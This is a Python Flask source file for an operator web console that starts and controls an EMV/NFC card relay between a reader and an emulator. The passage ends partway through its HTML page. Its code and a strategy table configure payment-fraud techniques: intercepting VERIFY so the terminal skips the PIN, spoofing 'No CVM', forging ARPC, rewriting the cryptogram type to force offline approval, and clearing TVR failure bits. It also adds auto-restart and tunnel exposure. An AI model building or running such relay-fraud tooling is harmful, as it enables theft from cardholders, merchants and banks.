#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Flask web server that exposes the rel8hf RelayServer on 0.0.0.0.

Provides a dashboard UI, REST API for relay management, live log streaming,
runtime toggle control, CDCVM status, SOFT_RESET / SESSION_RESET triggers,
synthesizer plugin config, and static file serving for comboapp assets.

The operator starts ONLY this web console.  No relay is pre-bound.
The operator uses the web UI to start/stop the relay and manage all runtime
settings through the WAN-exposed control module.
"""

from __future__ import annotations

import json
import logging
import os
import socket
import struct
import sys
import threading
import time
from collections import deque
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

from flask import Flask, jsonify, render_template_string, request, send_from_directory

WEB_ROOT = Path(__file__).resolve().parent
PROJECT_ROOT = WEB_ROOT.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

import logger as _logger

log = logging.getLogger("rel8hf.web")

CHANNELS = ["server", "guard", "flow", "diag", "util"]
SID_CTRL = 0x0F
MAX_RELAY_FRAME_SIZE = 65507

TOGGLE_ATTRS = {
    "verify_bypass": "verify_bypass_enabled",
    "arpc_forge": "arpc_forge_enabled",
    "arpc_rewrite": "arpc_rewrite_enabled",
    "tvr_mutate": "tvr_mutation_enabled",
}


def _now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S.%f")


def _build_frame(sid: int, epoch: int, seq: int, payload: bytes) -> bytes:
    import constants as _const
    return _const.build_frame(sid, payload, seq=seq, epoch=epoch)


class LogCaptureHandler(logging.Handler):
    """Captures log records into per-channel deques for the web dashboard."""

    def __init__(self, state: "WebState") -> None:
        super().__init__()
        self.state = state

    def emit(self, record: logging.LogRecord) -> None:
        try:
            msg = self.format(record)
            ch = "guard" if "GUARD" in msg.upper() else "server"
            self.state.append(ch, f"[{record.levelname}] {msg}")
        except Exception:
            pass


class WebState:
    def __init__(self) -> None:
        self.lock = threading.RLock()
        self.logs: Dict[str, deque] = {ch: deque(maxlen=4000) for ch in CHANNELS}
        self.relay_server: Any = None
        self.relay_thread: Optional[threading.Thread] = None
        self.launch_config: Any = None
        self.relay_host: str = "0.0.0.0"
        self.relay_port: int = 5566
        self.toggles: Dict[str, bool] = {
            "verify_bypass": True,
            "arpc_forge": False,
            "arpc_rewrite": False,
            "tvr_mutate": False,
        }
        self.watchdog_enabled: bool = False
        self.watchdog_interval: int = 0
        self._watchdog_thread: Optional[threading.Thread] = None
        self._watchdog_stop = threading.Event()
        self.cf_tunnel: Any = None

    def sync_toggles_from_config(self) -> None:
        cfg = self.launch_config
        if cfg is None:
            return
        self.toggles["verify_bypass"] = getattr(cfg, "verify_bypass", True)
        self.toggles["arpc_forge"] = getattr(cfg, "arpc_forge", False)
        self.toggles["arpc_rewrite"] = getattr(cfg, "arpc_rewrite", False)
        self.toggles["tvr_mutate"] = getattr(cfg, "tvr_mutate", False)

    def append(self, channel: str, line: str) -> None:
        ch = channel if channel in CHANNELS else "util"
        with self.lock:
            ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
            self.logs.setdefault(ch, deque(maxlen=4000)).append(f"[{ts}] {line.rstrip()}")

    def read(self, channel: str, n: int = 400) -> List[str]:
        ch = channel if channel in CHANNELS else "server"
        with self.lock:
            items = list(self.logs.get(ch, deque()))
        return items[-max(1, min(n, 2000)):]

    def clear(self, channel: Optional[str] = None) -> None:
        with self.lock:
            if channel is None or channel == "all":
                for ch in self.logs:
                    self.logs[ch].clear()
            else:
                self.logs.setdefault(channel, deque(maxlen=4000)).clear()

    def is_relay_running(self) -> bool:
        srv = self.relay_server
        if srv is None:
            return False
        return getattr(srv, "running", False)

    def relay_status_dict(self) -> Dict[str, Any]:
        srv = self.relay_server
        running = self.is_relay_running()
        if srv is not None and running:
            state = getattr(srv, "state", None)
            guard = getattr(srv, "guard", None)
            return {
                "running": True,
                "host": getattr(srv, "host", self.relay_host),
                "port": getattr(srv, "port", self.relay_port),
                "reader_addr": list(srv.reader_addr) if getattr(srv, "reader_addr", None) else None,
                "emulator_addr": list(srv.emulator_addr) if getattr(srv, "emulator_addr", None) else None,
                "reader_id": getattr(srv, "reader_id", None),
                "emulator_id": getattr(srv, "emulator_id", None),
                "active_epoch": getattr(srv, "active_epoch", 0),
                "guard_phase": guard.phase.name if guard else "UNKNOWN",
                "brand": getattr(state, "brand", "UNKNOWN") if state else "UNKNOWN",
                "card_present": getattr(state, "card_present", False) if state else False,
                "selected_aid": getattr(state, "selected_aid", None).hex().upper() if state and getattr(state, "selected_aid", None) else None,
                "cdcvm_verified": getattr(state, "cdcvm_verified", False) if state else False,
                "cdcvm_evidence": getattr(state, "cdcvm_evidence", None) if state else None,
                "verify_bypass": getattr(state, "verify_bypass_enabled", False) if state else self.toggles["verify_bypass"],
                "arpc_forge": getattr(state, "arpc_forge_enabled", False) if state else self.toggles["arpc_forge"],
                "arpc_rewrite": getattr(state, "arpc_rewrite_enabled", False) if state else self.toggles["arpc_rewrite"],
                "tvr_mutate": getattr(state, "tvr_mutation_enabled", False) if state else self.toggles["tvr_mutate"],
                "verify_bypass_count": getattr(state, "verify_bypass_count", 0) if state else 0,
                "arpc_forge_count": getattr(state, "arpc_forge_count", 0) if state else 0,
                "arpc_rewrite_count": getattr(state, "arpc_rewrite_count", 0) if state else 0,
                "tvr_mutation_count": getattr(state, "tvr_mutation_count", 0) if state else 0,
                "gac_response_count": getattr(state, "gac_response_count", 0) if state else 0,
                "second_ae_pending": getattr(state, "second_ae_pending", False) if state else False,
                "second_ae_reason": getattr(state, "second_ae_reason", "") if state else "",
                "full_output": getattr(srv, "full_output_enabled", False),
                "outcome_guard": getattr(srv, "outcome_guard_enabled", False),
                "gpo_force_success": getattr(srv, "gpo_force_success_enabled", False),
                "policy_amount_cents": getattr(srv, "policy_amount_cents", 0),
                "floor_limit_cents": getattr(srv, "_floor_limit_cents", 0),
                "floor_limit_override": int(os.environ.get("RELAY_FLOOR_LIMIT_OVERRIDE_CENTS", "0") or "0"),
                "watchdog_enabled": self.watchdog_enabled,
                "watchdog_interval": self.watchdog_interval,
                "card_present_timeout": getattr(srv, "card_present_timeout_seconds", 0),
            }
        return {
            "running": False,
            "host": self.relay_host,
            "port": self.relay_port,
            "reader_addr": None,
            "emulator_addr": None,
            "reader_id": None,
            "emulator_id": None,
            "active_epoch": 0,
            "guard_phase": "IDLE",
            "brand": "UNKNOWN",
            "card_present": False,
            "selected_aid": None,
            "cdcvm_verified": False,
            "cdcvm_evidence": None,
            "verify_bypass": self.toggles["verify_bypass"],
            "arpc_forge": self.toggles["arpc_forge"],
            "arpc_rewrite": self.toggles["arpc_rewrite"],
            "tvr_mutate": self.toggles["tvr_mutate"],
            "verify_bypass_count": 0,
            "arpc_forge_count": 0,
            "arpc_rewrite_count": 0,
            "tvr_mutation_count": 0,
            "gac_response_count": 0,
            "second_ae_pending": False,
            "second_ae_reason": "",
            "full_output": False,
            "outcome_guard": False,
            "gpo_force_success": False,
            "policy_amount_cents": 0,
            "floor_limit_cents": 0,
            "floor_limit_override": int(os.environ.get("RELAY_FLOOR_LIMIT_OVERRIDE_CENTS", "0") or "0"),
            "watchdog_enabled": self.watchdog_enabled,
            "watchdog_interval": self.watchdog_interval,
        }

    def config_dict(self) -> Dict[str, Any]:
        cfg = self.launch_config
        if cfg is None:
            return {}
        d = cfg.to_dict() if hasattr(cfg, "to_dict") else {}
        if hasattr(cfg, "risk_level"):
            d["risk_level"] = cfg.risk_level()
        return d

    def start_relay(self) -> Dict[str, Any]:
        with self.lock:
            if self.is_relay_running():
                return {"ok": False, "error": "relay already running"}
            cfg = self.launch_config
            if cfg is None:
                return {"ok": False, "error": "no launch config loaded"}
            try:
                from rel8hf import RelayServer
            except Exception as exc:
                return {"ok": False, "error": f"cannot import RelayServer: {exc}"}
            host = getattr(cfg, "host", self.relay_host)
            port = getattr(cfg, "port", self.relay_port)
            cfg.apply_env()
            srv = RelayServer(host=host, port=port)
            srv.state.verify_bypass_enabled = self.toggles["verify_bypass"]
            srv.state.arpc_forge_enabled = self.toggles["arpc_forge"]
            srv.state.arpc_rewrite_enabled = self.toggles["arpc_rewrite"]
            srv.state.tvr_mutation_enabled = self.toggles["tvr_mutate"]
            self.relay_server = srv
            self.relay_host = host
            self.relay_port = port

            def _run():
                try:
                    srv.start()
                except Exception as exc:
                    self.append("server", f"[FATAL] {exc}")
                finally:
                    self.append("server", "[relay stopped]")

            self.relay_thread = threading.Thread(target=_run, daemon=True)
            self.relay_thread.start()
            self.append("server", f"[relay starting on {host}:{port}]")
            return {"ok": True, "host": host, "port": port}

    def stop_relay(self) -> Dict[str, Any]:
        with self.lock:
            srv = self.relay_server
            if srv is None or not self.is_relay_running():
                return {"ok": False, "error": "relay not running"}
            srv.stop()
            if self.relay_thread and self.relay_thread.is_alive():
                self.relay_thread.join(timeout=5)
            self.append("server", "[relay stopped by operator]")
            return {"ok": True}

    def set_watchdog(self, enabled: bool, interval: int) -> Dict[str, Any]:
        with self.lock:
            self.watchdog_enabled = enabled
            self.watchdog_interval = max(1, interval) if enabled else 0
            if enabled:
                self._watchdog_stop.clear()
                if self._watchdog_thread is None or not self._watchdog_thread.is_alive():
                    self._watchdog_thread = threading.Thread(target=self._watchdog_loop, daemon=True)
                    self._watchdog_thread.start()
                self.append("server", f"[watchdog] enabled — restart every {self.watchdog_interval}s if relay dies")
            else:
                self._watchdog_stop.set()
                self._watchdog_thread = None
                self.append("server", "[watchdog] disabled")
            return {"ok": True, "enabled": self.watchdog_enabled, "interval": self.watchdog_interval}

    def _watchdog_loop(self) -> None:
        while not self._watchdog_stop.is_set():
            if self._watchdog_stop.wait(self.watchdog_interval):
                break
            with self.lock:
                if not self.watchdog_enabled:
                    break
                if not self.is_relay_running():
                    self.append("server", f"[watchdog] relay died — restarting with last settings")
                    result = self.start_relay()
                    if result.get("ok"):
                        self.append("server", f"[watchdog] relay restarted on {result.get('host')}:{result.get('port')}")
                    else:
                        self.append("server", f"[watchdog] restart failed: {result.get('error', 'unknown')}")

    def update_toggles(self, toggles: Dict[str, bool]) -> Dict[str, Any]:
        applied = {}
        with self.lock:
            for key, val in toggles.items():
                if key in self.toggles:
                    self.toggles[key] = bool(val)
                    applied[key] = bool(val)
                    self.append("server", f"[toggle] {key}={'ON' if val else 'OFF'}")
            cfg = self.launch_config
            if cfg is not None:
                for key in self.toggles:
                    if hasattr(cfg, key):
                        setattr(cfg, key, self.toggles[key])
            srv = self.relay_server
            if srv is not None and self.is_relay_running():
                for key, val in toggles.items():
                    attr = TOGGLE_ATTRS.get(key)
                    if attr and hasattr(srv.state, attr):
                        setattr(srv.state, attr, bool(val))
        return {"ok": True, "applied": applied}

    def update_config(self, updates: Dict[str, Any]) -> Dict[str, Any]:
        cfg = self.launch_config
        if cfg is None:
            return {"ok": False, "error": "no config loaded"}
        applied = {}
        with self.lock:
            for key, val in updates.items():
                if hasattr(cfg, key):
                    setattr(cfg, key, val)
                    applied[key] = val
                    if key in self.toggles:
                        self.toggles[key] = bool(val)
            cfg.apply_env()
            srv = self.relay_server
            if srv is not None and self.is_relay_running():
                cfg.apply_runtime_state(srv)
            self.append("server", f"[config updated] {json.dumps(applied)}")
        return {"ok": True, "applied": applied}

    def apply_preset(self, name: str) -> Dict[str, Any]:
        try:
            from rel8hf_launcher import PRESETS
        except Exception:
            return {"ok": False, "error": "cannot import PRESETS from launcher"}
        name = name.strip().lower()
        if name not in PRESETS:
            return {"ok": False, "error": f"unknown preset: {name}"}
        cfg = self.launch_config
        if cfg is None:
            return {"ok": False, "error": "no config loaded"}
        preset = PRESETS[name]
        with self.lock:
            for key, val in preset.items():
                if hasattr(cfg, key):
                    setattr(cfg, key, val)
                    if key in self.toggles:
                        self.toggles[key] = bool(val)
            cfg.apply_env()
            srv = self.relay_server
            if srv is not None and self.is_relay_running():
                cfg.apply_runtime_state(srv)
            self.append("server", f"[preset] {name} applied — risk={cfg.risk_level()}")
        return {"ok": True, "preset": name, "risk_level": cfg.risk_level()}

    STRATEGY_MAP = {
        "nocvm_signature": {
            "label": "No CVM / Signature",
            "order": 1,
            "applies": {"policy_mode": "OFFLINE_NOCVM"},
            "hint": "CVM List rewrite (0x01 No CVM first) + CVM spoof 9F34=010000. Fires at GPO + READ RECORD.",
        },
        "bypass_pin": {
            "label": "Bypass PIN Prompt",
            "order": 2,
            "applies": {"verify_bypass": True},
            "hint": "VERIFY command intercept — returns 6988 (not present) so terminal skips PIN. Safety net if CVM prevention at step 1 fails.",
        },
        "force_offline": {
            "label": "Force Offline Approval",
            "order": 3,
            "applies": {"arpc_forge": True, "arpc_rewrite": True, "tvr_mutate": True},
            "hint": "Forge ARPC + rewrite 2nd GAC CID to 0x40 (TC) + clear TVR failure bits. Endgame — needs valid ARQC from steps 1-2.",
        },
    }

    def apply_strategy(self, body: Dict[str, Any]) -> Dict[str, Any]:
        cfg = self.launch_config
        if cfg is None:
            return {"ok": False, "error": "no config loaded"}
        enabled = body.get("enabled", {})
        if not isinstance(enabled, dict):
            return {"ok": False, "error": "enabled must be a dict of strategy->bool"}
        applied: Dict[str, Any] = {}
        with self.lock:
            for strat_name, strat_on in enabled.items():
                info = self.STRATEGY_MAP.get(strat_name)
                if info is None:
                    continue
                for key, val in info["applies"].items():
                    if hasattr(cfg, key):
                        if key in self.toggles and not strat_on:
                            off_val = False if isinstance(val, bool) else None
                            if off_val is not None:
                                setattr(cfg, key, off_val)
                                self.toggles[key] = False
                                applied[key] = False
                            else:
                                if strat_on:
                                    setattr(cfg, key, val)
                                    self.toggles[key] = bool(val)
                                    applied[key] = val
                        elif strat_on:
                            setattr(cfg, key, val)
                            if key in self.toggles:
                                self.toggles[key] = bool(val)
                            applied[key] = val
                applied[strat_name] = strat_on
                self.append("server", f"[strategy] {info['label']} {'ON' if strat_on else 'OFF'}")
            cfg.apply_env()
            srv = self.relay_server
            if srv is not None and self.is_relay_running():
                cfg.apply_runtime_state(srv)
        return {"ok": True, "applied": applied}

    def send_relay_ctrl(self, command: str) -> Dict[str, Any]:
        srv = self.relay_server
        if srv is None or not self.is_relay_running():
            return {"ok": False, "error": "relay not running"}
        host = getattr(srv, "host", self.relay_host)
        port = getattr(srv, "port", self.relay_port)
        result = _relay_udp_request(host, port, command)
        self.append("server", f"[ctrl] {command} -> {result.get('ok', False)}")
        return result


STATE = WebState()


def _relay_udp_request(host: str, port: int, command: str, timeout: float = 2.5) -> Dict[str, Any]:
    """Send a CTRL command to the relay via UDP and return the response."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.bind(("0.0.0.0", 0))
        frame = _build_frame(SID_CTRL, 0, 0, command.encode("utf-8"))
        t0 = time.perf_counter()
        sock.sendto(frame, (host, port))
        end = time.time() + timeout
        while time.time() < end:
            try:
                raw, _ = sock.recvfrom(MAX_RELAY_FRAME_SIZE)
            except socket.timeout:
                break
            txt = raw.decode("utf-8", "ignore")
            rtt_ms = round((time.perf_counter() - t0) * 1000.0, 2)
            try:
                return {"ok": True, "result": json.loads(txt), "rtt_ms": rtt_ms}
            except Exception:
                return {"ok": True, "result": txt, "rtt_ms": rtt_ms}
        return {"ok": False, "error": "no response"}
    except Exception as exc:
        return {"ok": False, "error": str(exc)}
    finally:
        try:
            sock.close()
        except Exception:
            pass


def create_app(state: Optional[WebState] = None) -> Flask:
    st = state or STATE
    app = Flask(__name__, static_folder=None)

    @app.after_request
    def _no_cache(resp):
        resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
        resp.headers["Pragma"] = "no-cache"
        resp.headers["Expires"] = "0"
        return resp

    @app.get("/")
    def index():
        return render_template_string(PAGE, state=st)

    @app.get("/api/state")
    def api_state():
        return jsonify({
            "ok": True,
            "relay": st.relay_status_dict(),
            "config": st.config_dict(),
            "web_host": os.environ.get("REL8HF_WEB_HOST", "0.0.0.0"),
            "web_port": int(os.environ.get("REL8HF_WEB_PORT", "8090")),
        })

    @app.get("/api/logs")
    def api_logs():
        ch = request.args.get("channel", "server")
        n = int(request.args.get("n", "400"))
        return jsonify({"ok": True, "channel": ch, "lines": st.read(ch, n)})

    @app.get("/api/logs/batch")
    def api_logs_batch():
        n = int(request.args.get("n", "300"))
        payload = {ch: st.read(ch, n) for ch in CHANNELS}
        return jsonify({"ok": True, "channels": payload})

    @app.post("/api/logs/clear")
    def api_logs_clear():
        p = request.json or {}
        ch = p.get("channel", "all")
        st.clear(ch)
        return jsonify({"ok": True, "channel": ch})

    @app.post("/api/relay/start")
    def api_relay_start():
        return jsonify(st.start_relay())

    @app.post("/api/relay/stop")
    def api_relay_stop():
        return jsonify(st.stop_relay())

    @app.post("/api/relay/watchdog")
    def api_relay_watchdog():
        p = request.json or {}
        enabled = bool(p.get("enabled", False))
        interval = int(p.get("interval", 10))
        return jsonify(st.set_watchdog(enabled, interval))

    @app.post("/api/tunnel/start")
    def api_tunnel_start():
        p = request.json or {}
        token = (p.get("token") or "").strip()
        if not token:
            return jsonify({"ok": False, "error": "missing token"})
        try:
            from rel8hf_launcher import CloudflaredTunnel
        except Exception:
            return jsonify({"ok": False, "error": "CloudflaredTunnel not available"})
        if st.cf_tunnel is not None:
            st.cf_tunnel.stop()
        web_port = int(os.environ.get("REL8HF_WEB_PORT", "8090"))
        tunnel = CloudflaredTunnel(token, web_port, st)
        if tunnel.start():
            st.cf_tunnel = tunnel
            return jsonify({"ok": True})
        return jsonify({"ok": False, "error": "cloudflared binary not found"})

    @app.post("/api/tunnel/stop")
    def api_tunnel_stop():
        if st.cf_tunnel is None:
            return jsonify({"ok": False, "error": "no tunnel running"})
        st.cf_tunnel.stop()
        st.cf_tunnel = None
        return jsonify({"ok": True})

    @app.get("/api/tunnel/status")
    def api_tunnel_status():
        if st.cf_tunnel is None:
            return jsonify({"running": False})
        proc = getattr(st.cf_tunnel, "proc", None)
        alive = proc is not None and proc.poll() is None
        return jsonify({"running": alive})

    @app.post("/api/relay/toggles")
    def api_relay_toggles():
        p = request.json or {}
        return jsonify(st.update_toggles(p))

    @app.post("/api/strategy/apply")
    def api_strategy_apply():
        p = request.json or {}
        return jsonify(st.apply_strategy(p))

    @app.post("/api/config/update")
    def api_config_update():
        p = request.json or {}
        return jsonify(st.update_config(p))

    @app.post("/api/config/preset")
    def api_config_preset():
        p = request.json or {}
        name = str(p.get("name", ""))
        return jsonify(st.apply_preset(name))

    @app.post("/api/relay/ctrl")
    def api_relay_ctrl():
        p = request.json or {}
        cmd = str(p.get("command", ""))
        if not cmd:
            return jsonify({"ok": False, "error": "missing command"})
        return jsonify(st.send_relay_ctrl(cmd))

    @app.post("/api/relay/soft-reset")
    def api_relay_soft_reset():
        _logger.clear_all()
        return jsonify(st.send_relay_ctrl("SOFT_RESET"))

    @app.post("/api/relay/session-reset")
    def api_relay_session_reset():
        _logger.clear_all()
        return jsonify(st.send_relay_ctrl("SESSION_RESET"))

    @app.post("/api/log/level")
    def api_log_level():
        p = request.json or {}
        level = str(p.get("level", "INFO")).upper()
        prev = _logger.set_log_level(level)
        return jsonify({"ok": True, "previous": prev, "current": level})

    @app.get("/api/log/stats")
    def api_log_stats():
        return jsonify(_logger.get_log_stats())

    @app.post("/api/diag/status")
    def api_diag_status():
        p = request.json or {}
        host = str(p.get("host", st.relay_host))
        port = int(p.get("port", st.relay_port))
        return jsonify(_relay_udp_request(host, port, "STATUS"))

    @app.post("/api/diag/dump")
    def api_diag_dump():
        p = request.json or {}
        host = str(p.get("host", st.relay_host))
        port = int(p.get("port", st.relay_port))
        count = int(p.get("count", 20))
        return jsonify(_relay_udp_request(host, port, f"DIAG_DUMP {count}"))

    @app.get("/api/project/files")
    def api_project_files():
        items = []
        for entry in sorted(PROJECT_ROOT.iterdir(), key=lambda p: (not p.is_dir(), p.name.lower())):
            if entry.name.startswith(".") or entry.name.startswith("_"):
                continue
            stat = entry.stat()
            items.append({
                "name": entry.name,
                "path": str(entry),
                "is_dir": entry.is_dir(),
                "size": stat.st_size,
            })
        return jsonify({"ok": True, "cwd": str(PROJECT_ROOT), "items": items})

    @app.get("/api/project/file")
    def api_project_file():
        name = request.args.get("name", "")
        path = PROJECT_ROOT / name
        try:
            resolved = path.resolve()
            if PROJECT_ROOT not in resolved.parents and resolved != PROJECT_ROOT:
                return jsonify({"ok": False, "error": "path outside project"})
            if not resolved.is_file():
                return jsonify({"ok": False, "error": "not a file"})
            text = resolved.read_text(encoding="utf-8", errors="replace")
            return jsonify({"ok": True, "name": name, "text": text})
        except Exception as exc:
            return jsonify({"ok": False, "error": str(exc)})

    @app.get("/project/<path:filename>")
    def project_static(filename: str):
        return send_from_directory(str(PROJECT_ROOT), filename)

    return app


def attach_log_capture(state: WebState) -> LogCaptureHandler:
    """Attach a log handler that captures relay logs into the web state."""
    handler = LogCaptureHandler(state)
    handler.setLevel(logging.DEBUG)
    handler.setFormatter(logging.Formatter("%(name)s: %(message)s"))
    root_log = logging.getLogger()
    root_log.addHandler(handler)
    return handler


def run_web_server(
    state: Optional[WebState] = None,
    host: str = "0.0.0.0",
    port: int = 8090,
) -> None:
    """Start the web server (blocking).  Use waitress when available."""
    st = state or STATE
    if not any(isinstance(h, LogCaptureHandler) for h in logging.getLogger().handlers):
        attach_log_capture(st)
    app = create_app(st)
    st.append("server", f"[web] listening on http://{host}:{port}")
    print(f"rel8hf web console on http://{host}:{port}")
    try:
        from waitress import serve
        serve(app, host=host, port=port, threads=6)
    except ImportError:
        logging.getLogger("werkzeug").setLevel(logging.ERROR)
        app.run(host=host, port=port, debug=False, use_reloader=False)


PAGE = r"""
<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>rel8hf Control Console</title>
  <style>
    :root {
      --bg:#09111f; --bg2:#10233f; --panel:#0f1a2d; --line:#28456c; --txt:#e8f0ff; --muted:#88a2c8;
      --a:#37c4a4; --a2:#52b7ff; --bad:#f49aa4; --ok:#89f0ad; --warn:#ffd48a; --accent:#a855f7;
    }
    *{box-sizing:border-box;}
    body{margin:0;color:var(--txt);background:radial-gradient(1200px 900px at 0 -25%,#274d7b 0%,var(--bg) 45%);font-family:"Trebuchet MS","Lucida Grande",Verdana,sans-serif;}
    .top{padding:14px 16px;border-bottom:1px solid #2c496f;display:flex;justify-content:space-between;align-items:center;background:rgba(8,14,25,0.8);backdrop-filter:blur(4px);position:sticky;top:0;z-index:10;}
    .title{font-size:20px;font-weight:700;letter-spacing:.4px;}
    .title .sub{font-size:12px;color:var(--muted);font-weight:400;}
    .status{font-size:12px;color:var(--muted);}
    .tabs{display:flex;gap:8px;flex-wrap:wrap;padding:10px 14px;border-bottom:1px solid #233d61;background:linear-gradient(180deg,rgba(11,21,39,0.65),rgba(8,15,27,0.65));}
    .tab{border:1px solid #2f537f;background:#10213a;color:#cfe2ff;border-radius:10px;padding:7px 10px;cursor:pointer;font-weight:700;transition:all .2s;}
    .tab:hover{background:#163056;border-color:#3a6ba8;}
    .tab.active{background:linear-gradient(90deg,var(--a),var(--a2));color:#08212e;border-color:transparent;}
    .page{padding:14px;}
    .panel{display:none;}
    .panel.active{display:block;}
    .grid{display:grid;gap:10px;grid-template-columns:repeat(12,minmax(0,1fr));}
    .card{background:linear-gradient(180deg,#122038,var(--panel));border:1px solid var(--line);border-radius:12px;padding:10px;transition:border-color .2s;}
    .card:hover{border-color:#3a6ba8;}
    .card h3{margin:0 0 8px;color:#74d6ff;font-size:15px;}
    .hint{color:var(--muted);font-size:12px;margin-bottom:8px;}
    .row{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px;}
    label{font-size:12px;color:var(--muted);display:block;margin-bottom:4px;}
    input,select,textarea{width:100%;color:var(--txt);background:#081224;border:1px solid #2d4f7c;border-radius:8px;padding:7px 9px;}
    input:focus,select:focus,textarea:focus{border-color:var(--a2);outline:none;box-shadow:0 0 0 2px rgba(82,183,255,0.15);}
    textarea{min-height:200px;resize:vertical;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:12px;}
    .btn{border:0;border-radius:9px;padding:8px 11px;font-weight:700;cursor:pointer;background:linear-gradient(90deg,var(--a),var(--a2));color:#08222a;transition:opacity .2s,transform .1s;}
    .btn:hover{opacity:.9;transform:translateY(-1px);}
    .btn:active{transform:translateY(0);}
    .btn.alt{background:#243f63;color:#dce9ff;}
    .btn.red{background:#7c2433;color:#ffe7ed;}
    .btn.warn{background:#6c4c1f;color:#ffefce;}
    .btn.purple{background:linear-gradient(90deg,#7c3aed,#a855f7);color:#fff;}
    .col-3{grid-column:span 3;} .col-4{grid-column:span 4;} .col-6{grid-column:span 6;} .col-8{grid-column:span 8;} .col-12{grid-column:1/-1;}
    .log{background:#050b17;border:1px solid #2a4468;border-radius:10px;overflow:auto;min-height:160px;max-height:340px;padding:6px;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:12px;}
    .log.full{min-height:58vh;max-height:58vh;}
    .log-row{border-bottom:1px solid #1a2d4a;padding:4px 6px;white-space:pre-wrap;line-height:1.35;}
    .log-row:last-child{border-bottom:0;}
    .lv-green{color:var(--ok);} .lv-blue{color:#95c8ff;} .lv-red{color:var(--bad);font-weight:700;} .lv-neutral{color:#d1ddf6;} .lv-warn{color:var(--warn);} .lv-purple{color:#c9a3f5;}
    .kpi{font-size:13px;line-height:1.6;color:#cde0ff;}
    .kpi b{color:#fff;}
    .toggle-row{display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid #1a2d4a;}
    .toggle-row:last-child{border-bottom:0;}
    .toggle-row .name{flex:1;font-size:13px;}
    .toggle-row .state{font-weight:700;font-size:13px;min-width:50px;text-align:right;}
    .file-list{max-height:300px;overflow:auto;border:1px solid #2a4468;border-radius:10px;background:#081224;}
    .file-item{padding:6px 8px;border-bottom:1px solid #1a2d4a;cursor:pointer;font-size:12px;}
    .file-item:last-child{border-bottom:0;}
    .file-item:hover{background:#11223c;}
    .muted{color:var(--muted);}
    .badge{display:inline-block;padding:2px 8px;border-radius:6px;font-size:11px;font-weight:700;}
    .badge.on{background:#1a4a2e;color:var(--ok);}
    .badge.off{background:#3a1a22;color:var(--bad);}
    .badge.cdcvm{background:#2a1a4a;color:#c9a3f5;}
    .phase-bar{display:flex;gap:2px;flex-wrap:wrap;margin:6px 0;}
    .phase-pill{padding:3px 7px;border-radius:5px;font-size:10px;font-weight:700;background:#1a2d4a;color:#6a8ab8;}
    .phase-pill.done{background:#1a4a2e;color:var(--ok);}
    .phase-pill.active{background:linear-gradient(90deg,var(--a),var(--a2));color:#08212e;}
    .phase-pill.error{background:#3a1a22;color:var(--bad);}
    .indicator{display:inline-flex;align-items:center;gap:5px;font-size:12px;}
    .dot{width:8px;height:8px;border-radius:50%;display:inline-block;}
    .dot.on{background:var(--ok);box-shadow:0 0 6px var(--ok);}
    .dot.off{background:#3a1a22;}
    .dot.cdcvm{background:var(--accent);box-shadow:0 0 6px var(--accent);}
    .stat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:6px;margin:6px 0;}
    .stat-box{background:#081224;border:1px solid #2a4468;border-radius:8px;padding:6px 8px;text-align:center;}
    .stat-box .val{font-size:20px;font-weight:700;color:#fff;}
    .stat-box .lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;}
    .danger-zone{border:1px dashed #7c2433;border-radius:10px;padding:10px;margin-top:8px;}
    .danger-zone h4{margin:0 0 6px;color:var(--bad);font-size:13px;}
    @media(max-width:1100px){.col-3,.col-4,.col-6,.col-8{grid-column:1/-1;}.log.full{min-height:42vh;max-height:42vh;}}
  </style>
</head>
<body>
  <div class="top">
    <div class="title">rel8hf Control Console <span class="sub">WAN-exposed operator module</span></div>
    <div class="status" id="state_line">connecting...</div>
  </div>
  <div class="tabs">
    <button class="tab active" data-tab="relay">1. Relay Control</button>
    <button class="tab" data-tab="toggles">2. Runtime Toggles</button>
    <button class="tab" data-tab="config">3. Configuration</button>
    <button class="tab" data-tab="cdcvm">4. CDCVM &amp; Guard</button>
    <button class="tab" data-tab="diag">5. Diagnostics</button>
    <button class="tab" data-tab="logs">6. Live Logs</button>
    <button class="tab" data-tab="files">7. Project Files</button>
  </div>

  <div class="page">

  <section class="panel active" id="panel_relay">
    <div class="grid">
      <div class="card col-8">
        <h3>Relay Server</h3>
        <div class="hint">Start and stop the rel8hf UDP relay. The relay binds 0.0.0.0 and is reachable from any network interface. No relay is started until you click Start.</div>
        <div class="kpi" id="relay_kpi">querying...</div>
        <div class="row" style="margin-top:10px;">
          <button class="btn" onclick="relayStart()">Start Relay</button>
          <button class="btn red" onclick="relayStop()">Stop Relay</button>
          <button class="btn warn" onclick="relaySoftReset()">SOFT RESET</button>
          <button class="btn red" onclick="relaySessionReset()">SESSION RESET</button>
          <button class="btn alt" onclick="clearChannel('server')">Clear Server Log</button>
        </div>
      </div>
      <div class="card col-4">
        <h3>Peer Status</h3>
        <div class="kpi" id="peer_kpi">no peers</div>
      </div>
      <div class="card col-4">
        <h3>Auto-Restart Watchdog</h3>
        <div class="hint">If the relay dies, it restarts automatically with the same settings after the interval you set.</div>
        <div class="row" style="margin-top:8px;">
          <label>Check every:</label>
          <input type="number" id="wd_interval" value="10" min="1" max="3600" style="width:70px"/> sec
        </div>
        <div class="row" style="margin-top:8px;">
          <button class="btn" onclick="watchdogEnable(true)">Enable Watchdog</button>
          <button class="btn red" onclick="watchdogEnable(false)">Disable</button>
        </div>
        <div class="kpi" id="wd_kpi" style="margin-top:6px;">disabled</div>
      </div>
      <div class="card col-4">
        <h3>Card-Present Timeout</h3>
